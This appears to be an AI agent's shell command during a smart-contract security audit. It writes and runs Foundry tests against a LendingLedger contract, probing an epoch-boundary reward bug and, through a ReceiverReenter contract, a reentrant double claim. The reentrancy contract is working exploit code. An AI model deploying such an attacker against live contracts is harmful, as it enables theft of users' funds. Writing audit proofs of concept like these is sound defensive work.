inner_command:
set -e
cd /home/agent/audit
cat > /tmp/LendingLedgerAudit.t.sol <<'EOF'
// SPDX-License-Identifier: GPL-3.0-only
pragma solidity >=0.8.0;

import {Test} from "forge-std/Test.sol";
import {LendingLedger} from "src/LendingLedger.sol";

contract DummyGaugeController2 {
    function gauge_relative_weight_write(address, uint256) external pure returns (uint256) {
        return 1 ether;
    }
}

contract ReceiverReenter {
    LendingLedger ledger;
    address market;
    bool entered;
    constructor(LendingLedger _ledger, address _market) { ledger = _ledger; market = _market; }
    receive() external payable {
        if (!entered) {
            entered = true;
            ledger.claim(market);
        }
    }
    function claim() external { ledger.claim(market); }
}

contract AuditTest is Test {
    uint256 constant BLOCK_EPOCH = 100_000;
    DummyGaugeController2 controller;
    LendingLedger ledger;
    address gov = address(0xBEEF);
    address market = address(0xCAFE);
    address user = address(0xA11CE);

    function setUp() public {
        controller = new DummyGaugeController2();
        ledger = new LendingLedger(address(controller), gov);
        vm.prank(gov);
        ledger.whiteListLendingMarket(market, true);
    }

    function testEpochBoundaryUsesWrongNextEpoch() public {
        vm.prank(gov);
        ledger.setRewards(BLOCK_EPOCH, BLOCK_EPOCH, 1 ether);
        vm.roll(BLOCK_EPOCH + 1);
        vm.prank(market);
        ledger.sync_ledger(user, 1 ether);
        payable(address(ledger)).transfer(10 ether);
        vm.roll(BLOCK_EPOCH * 2);
        uint256 balBefore = user.balance;
        vm.prank(user);
        ledger.claim(market);
        uint256 claimed = user.balance - balBefore;
        emit log_named_uint("claimed", claimed);
    }

    function testReentrantClaimDoublePayout() public {
        ReceiverReenter attacker = new ReceiverReenter(ledger, market);
        vm.prank(gov);
        ledger.setRewards(BLOCK_EPOCH * 5, BLOCK_EPOCH * 5, 1e13);
        vm.roll(BLOCK_EPOCH * 5);
        vm.prank(market);
        ledger.sync_ledger(address(attacker), 1 ether);
        payable(address(ledger)).transfer(10 ether);
        vm.roll(BLOCK_EPOCH * 5 + 10);
        uint256 beforeBal = address(attacker).balance;
        attacker.claim();
        emit log_named_uint("attacker received", address(attacker).balance - beforeBal);
    }
}
EOF
forge test --match-path /tmp/LendingLedgerAudit.t.sol -vv

